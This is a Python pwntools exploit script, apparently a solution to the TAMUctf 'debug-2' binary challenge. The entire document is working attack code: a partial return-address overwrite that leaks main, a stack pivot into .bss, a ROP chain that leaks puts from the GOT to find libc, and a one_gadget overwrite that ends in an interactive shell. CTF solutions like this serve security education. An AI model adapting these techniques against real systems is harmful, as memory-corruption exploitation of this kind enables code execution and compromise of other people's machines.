#!/usr/bin/env python3

from pwn import *

e = ELF("debug-2_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-2.28.so")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            b *menu
            # b *main
            b *menu+212
            b *modify+41
            c
            """)
    elif cond == 3:
        r = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-2")

    return r


def main():
    r = conn(1)

    # Offset Calculation
    sBuffer = 0x7fffffffd710
    sRip =    0x7fffffffd768
    offsetRip = sRip - sBuffer # 0x58

    r.sendlineafter(b" Exit\n", b"1")

    payload = b"A"*offsetRip + b"\xdd"
    r.sendafter(b" 69 characters)", payload) # Now we are back into main+43 (call menu)

    # With this we can leak the address of main
    r.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    output = r.recvline()[:-1]
    leakMain = u64(output.ljust(8, b"\x00"))
    log.info(f"leakMain: {hex(leakMain)}")

    sbaseCode = 0x555555554000
    sLeakMain = 0x5555555553dd
    offsetBaseCode = sbaseCode - sLeakMain
    e.address = leakMain + offsetBaseCode
    log.info(f"baseCode: {hex(e.address)}")

    #-----------------------------------------------------------------------------------------------------

    def convert_case(byte):
        targetAddress = bytearray(byte)  # Convert to mutable bytearray
        for i, byte in enumerate(targetAddress):
            if 97 <= byte <= 122:
                targetAddress[i] = byte - 32  # Convert to uppercase
            elif 65 <= byte <= 90:
                targetAddress[i] = byte + 32  # Convert to lowercase

        return bytes(targetAddress)  # Convert back to immutable bytes if needed


    log.info(f"bss: {hex(e.bss())}")
    log.info(f"got puts: {hex(e.got['puts'])}")
    log.info(f"plt puts: {hex(e.plt['puts'])}")

    # stack pivoting
    payload = b"A"*(offsetRip - 8)
    payload += convert_case(p64(e.bss() + 0x808))
    payload += convert_case(p64(e.symbols["menu"] + 4))

    r.sendlineafter(b" Exit\n", b"1")
    r.sendafter(b" 69 characters)", payload)

    #-----------------------------------------------------------------------------------------------------

    r.sendlineafter(b" Exit\n", b"1")

    sBss =      0x555555558020
    sBuffer =   0x5555555587d8 # this offset is due to the new stack being in the bss that is to much short to the stack of functions like printf and scanf
    offsetToPayload = sBuffer - sBss
    bufferBss = e.bss() + offsetToPayload + 8 # this + 8 is just for alignment


    addrMain55 = e.symbols["main"] + 55
    # 0x000000000000145b: pop rdi; ret;
    gadgetPopRdi = 0x000000000000145b + e.address
    rop = convert_case(p64(gadgetPopRdi))
    rop += convert_case(p64(e.got["puts"]))
    rop += convert_case(p64(addrMain55)) # puts
    rop += convert_case(p64(bufferBss)) # to put inside of RBP due to pop at the end of main
    rop += convert_case(p64(e.symbols["menu"] + 110))



    payload = b"GARBAGEE" # just for alignment
    payload += rop.ljust(0x48, b"N")
    payload += convert_case(p64(bufferBss - 8)) # to dont mess with the pivoting
    payload += convert_case(p64(e.symbols["menu"] +212)) # Go directly to leave ; ret to execute the ROP chain

    r.sendafter(b" 69 characters)", payload)

    r.recvuntil(b"garbagee")
    r.recvline()
    output = r.recvline()

    leakPuts = output[:-1]
    leakPuts = u64(leakPuts.ljust(8, b"\x00"))
    log.info(f"leakPuts: {hex(leakPuts)}")

    libc.address = leakPuts - libc.symbols["puts"]
    log.info(f"libc: {hex(libc.address)}")

    #-----------------------------------------------------------------------------------------------------

    finalPayload = b"K"*0x40
    finalPayload += p64(libc.address + 0xe5306) # this overwrites the return of read so no mangle is needed
    r.sendlineafter(b" characters", finalPayload)

    r.interactive()

if __name__ == "__main__":
    # author: s1gn3rs
    main()